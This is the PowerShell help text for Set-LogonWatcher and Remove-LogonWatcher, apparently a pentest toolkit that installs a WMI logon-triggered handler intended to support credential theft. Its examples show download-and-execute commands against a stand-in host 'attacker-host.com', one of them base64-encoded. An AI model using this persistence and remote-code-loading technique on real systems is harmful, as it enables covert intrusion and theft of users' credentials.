NAME
    Set-LogonWatcher

SYNOPSIS
    Set-LogonWatcher creates a WMI event handler in order to execute a command upon local or remote interactive user login.


SYNTAX
    Set-LogonWatcher [[-URL] <String>] [[-Command] <String>] [[-EncodedCommand] <String>] [<CommonParameters>]


DESCRIPTION
    Set-LogonWatcher creates a WMI event handler in order to execute a command upon local or remote interactive user lo
    gin.
    The primary purpose of the tool is to support credential theft during a pentest.
    Parameters:
    -URL An URL of a PowerShell script to load and execute.
    -Command PowerShell command(s) to execute.
    -EncodedCommand Base64 encoded PowerShell command(s).
    The EncodedCommand parameter can't be used together with the other two parameters.
    This script requires local admin privileges!


PARAMETERS
    -URL <String>
        URL to load the remote code from

    -Command <String>
        Command to execute

    -EncodedCommand <String>
        Base64 encoded command

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer and OutVariable. For more information, type,
        "get-help about_commonparameters".

    -------------------------- EXAMPLE 1 --------------------------

    C:\PS>Set-LogonWatcher -URL http://attacker-host.com/attacker-script.ps1 -Command Invoke-AttackerScript






    -------------------------- EXAMPLE 2 --------------------------

    C:\PS>Set-LogonWatcher -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0
    ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGE
    AYwBrAGU AcgAtAGgAbwBzAHQALgBjAG8AbQAvAGEAdAB0AGEAYwBrAGUAcgAtAHMAYwByAGkAcAB0AC4AcABzADEAJwApACkAOwBJAG4AdgBvAGsAZ
    QAtAEEAdAB0AGEAYwBrAGUAcgBTAGMAcgBpAHAAdAA=



NAME
    Remove-LogonWatcher

SYNOPSIS
    Remove-LogonWatcher removes the WMI event handler which was created with Set-LogonWatcher


SYNTAX
    Remove-LogonWatcher [<CommonParameters>]


DESCRIPTION
    Remove-LogonWatcher removes the WMI event handler which was created with Set-LogonWatcher.
    This script requires local admin privileges!


PARAMETERS
    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer and OutVariable. For more information, type,
        "get-help about_commonparameters".

    -------------------------- EXAMPLE 1 --------------------------

    C:\PS>Remove-LogonWatcher






